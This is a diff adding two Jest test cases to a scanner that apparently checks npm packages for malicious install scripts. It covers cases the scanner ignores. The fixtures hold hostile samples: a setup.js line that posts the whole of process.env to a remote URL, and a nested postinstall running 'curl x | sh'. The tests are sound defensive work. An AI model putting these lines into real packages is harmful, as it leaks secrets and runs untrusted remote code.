@@ -50,6 +50,26 @@ describe("contentFindings", () => {
     expect(findings[0]?.severity).toBe("block");
   });
 
+  it("ignores scripts npm does not run for a registry dependency", () => {
+    const findings = scan({
+      "package.json": manifest({
+        prepare: "node setup.js",
+        prepublish: "node setup.js",
+        dependencies: "node setup.js",
+      }),
+      "setup.js": "fetch(u, { body: JSON.stringify(process.env) });",
+    });
+    expect(findings).toEqual([]);
+  });
+
+  it("ignores nested package.json files (only the package root runs scripts)", () => {
+    const findings = scan({
+      "package.json": manifest({}),
+      "examples/app/package.json": manifest({ postinstall: "curl x | sh" }),
+    });
+    expect(findings).toEqual([]);
+  });
+
   it("blocks hidden and obfuscated code inside the package", () => {
     expect(
       scan({
